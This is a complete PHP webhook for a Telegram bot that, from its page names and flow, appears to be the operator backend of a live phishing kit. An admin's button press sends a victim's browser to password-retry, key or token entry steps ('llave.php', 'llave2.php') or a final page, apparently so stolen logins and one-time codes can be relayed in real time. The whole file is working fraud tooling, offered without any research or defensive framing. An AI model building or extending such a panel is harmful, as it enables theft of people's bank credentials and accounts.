<?php
// ───────────────────────────────────────────────────────────
// notify.php – Receives callback queries from Telegram bot
//               when admin presses inline buttons.
// Updates the matching session file so the user's polling
// page can redirect to the right URL.
// ───────────────────────────────────────────────────────────

error_reporting(0);
include "data.php";
require_once "state.php";

$website = 'https://api.telegram.org/bot' . $token;

$raw    = file_get_contents('php://input');
$update = json_decode($raw, true);

if (!is_array($update)) { http_response_code(200); exit; }

$cb = $update['callback_query'] ?? null;
if (!$cb) { http_response_code(200); exit; }

$cbId    = $cb['id'] ?? '';
$cbData  = $cb['data'] ?? '';     // expected:  "<sid>|<action>"
$msgId   = $cb['message']['message_id'] ?? null;
$chatId  = $cb['message']['chat']['id']  ?? null;
$adminUN = $cb['from']['username'] ?? ($cb['from']['first_name'] ?? '?');

[$sid, $btnAction] = array_pad(explode('|', $cbData, 2), 2, '');

// Map of button → next URL for the user
$redirects = [
  'llave'             => 'llave.php',
  'pass_inv'          => 'inicio.php?err=password',
  'llave2'            => 'llave2.php',
  'llave_inv'         => 'llave.php?err=invalid',
  'llave2_inv'        => 'llave2.php?err=invalid',
  'final'             => 'final.php',
];

$target = $redirects[$btnAction] ?? null;
$state  = sess_load($sid);

$ackText = '';
if ($state && $target) {
  $state['status']     = 'done';
  $state['redirect']   = $target;
  $state['decided_by'] = $adminUN;
  $state['decision']   = $btnAction;
  sess_save($sid, $state);
  $ackText = "→ $btnAction";
} else {
  $ackText = "Sesión no encontrada";
}

// ── 1. Acknowledge the callback so the spinner disappears ────
$ch = curl_init($website . '/answerCallbackQuery');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
  'callback_query_id' => $cbId,
  'text'              => $ackText,
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
@curl_exec($ch);
curl_close($ch);

// ── 2. Edit the message to remove buttons + show decision ────
if ($msgId && $chatId && $state && $target) {
  $orig   = $cb['message']['text'] ?? '';
  $footer = "\n\n☑️ <b>" . htmlspecialchars($btnAction) . "</b> · por @" . htmlspecialchars($adminUN);
  $ch = curl_init($website . '/editMessageText');
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id'    => $chatId,
    'message_id' => $msgId,
    'parse_mode' => 'HTML',
    'text'       => $orig . $footer,
  ]));
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_TIMEOUT, 5);
  @curl_exec($ch);
  curl_close($ch);
}

http_response_code(200);
echo 'ok';
